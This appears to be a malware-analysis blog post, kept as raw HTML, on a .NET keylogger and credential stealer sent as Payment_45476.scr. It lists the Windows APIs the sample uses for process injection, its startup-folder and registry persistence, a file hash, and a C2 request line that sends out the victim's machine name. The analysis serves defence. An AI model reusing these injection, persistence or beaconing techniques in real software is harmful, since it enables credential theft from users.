It came with compressed file named&nbsp;Product_details.gz. when extracted; it presented a file named&nbsp;Payment_45476.scr. This file is windows executable which was .net compiled, The file was then opened with a tool called ILSPY in order to analyze its inner workings.<br />
- Looking at its main function it seems it created two threads:<br />

The decoded data corresponds the imports the malware will be using:<br />
<ul>
<li>CreateProcessA &nbsp;</li>
<li>GetThreadContext&nbsp;</li>
<li>SetThreadContext&nbsp;</li>
<li>Wow64SetThreadContext&nbsp;</li>
<li>ReadProcessMemory&nbsp;</li>
<li>WriteProcessMemory&nbsp;</li>
<li>NtUnmapViewOfSection&nbsp;</li>
<li>VirtualAllocEx&nbsp;</li>
<li>ResumeThread</li>
</ul>
When this sample was executed it was clear the sample had malicious intents.It established persistence by copying itself to the startup folder and setting the autorun registry key at startup. The malware names itself "Important.exe" &nbsp;which on looking at the code it seems a static value set by the author. see below for registry and file activity.<br />
<pre style="background-image: URL(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3BSseRQK5drNADUxmKW_HunGN_shuu09s-BdNNRIlZa0mYIfo3APj1QHlou9h5-o3_uonzjqnmJux7GhlooNWvzEComGMbctf9LT0wuWwRkOE4oOTCNjLbNQgkptBuvEoxDu2jmL-xBto/s320/codebg.gif); background: #f0f0f0; border: 1px dashed #CCCCCC; color: black; font-family: arial; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> [CreateFile] Payment_45476.exe:1316 &gt; %AllUsersProfile%\Important.exe     [MD5: 7c6a2697df26582b438c21ee7ce5b0b1]

</code></pre>
<br />
The malware then starts to reach out to its c2. The requests indicate the malware has the following capabilities:<br />
<br />
<ul>
<li>Takes a screenshot of the current working window</li>
<li>Acts as a keylogger and credential stealer.</li>
<li>Captures clipboard content.&nbsp;</li>
</ul>
<pre style="background-image: URL(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3BSseRQK5drNADUxmKW_HunGN_shuu09s-BdNNRIlZa0mYIfo3APj1QHlou9h5-o3_uonzjqnmJux7GhlooNWvzEComGMbctf9LT0wuWwRkOE4oOTCNjLbNQgkptBuvEoxDu2jmL-xBto/s320/codebg.gif); background: #f0f0f0; border: 1px dashed #CCCCCC; color: black; font-family: arial; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> GET /wp-includes/css/keybase/post.php?type=notification&amp;machinename=PETERPC&amp;machinetime=11:58%20PM
